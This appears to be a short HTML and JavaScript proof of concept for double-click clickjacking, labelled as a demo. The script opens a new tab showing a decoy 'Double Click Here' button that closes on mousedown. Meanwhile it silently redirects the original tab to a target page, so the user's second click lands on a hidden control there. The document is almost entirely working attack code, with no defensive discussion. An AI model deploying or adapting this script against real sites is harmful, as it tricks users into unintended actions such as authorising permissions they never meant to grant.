<script>
    function openDoubleWindow(url, top, left, width, height) {
        var evilWindow = window.open("https://jackpotter.com/", "_blank"); // Open in a new tab
    
        var checkWindow = setInterval(function() {
            if (evilWindow && !evilWindow.closed) {
                clearInterval(checkWindow); // Stop checking once the window is loaded
    
                evilWindow.document.open();
                evilWindow.document.write(`
                    <script>
                    setTimeout(function() { 
                        opener.location = "${url}"; 
                    }, 1000);
                    </scri`+`pt>
    
                    <div id="doubleclick" type="button" class="button" 
                        style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" 
                        onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; this.style.transform='scale(1.05)';" 
                        onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; this.style.transform='scale(1)';">Double Click Here</div>
    
                    <script>
                    document.getElementById('doubleclick').addEventListener('mousedown', function() {
                        window.close();
                    });
                    </scr`+`ipt>
                `);
                evilWindow.document.close();
            }
        }, 500); // Check every 500ms
    }
    </script>
    
    <!-- Button to trigger the function -->
    <button onclick="openDoubleWindow('https://tusharvashistha26.github.io/hijacking/', 647, 588.5, 260, 43)">Start Demo</button>
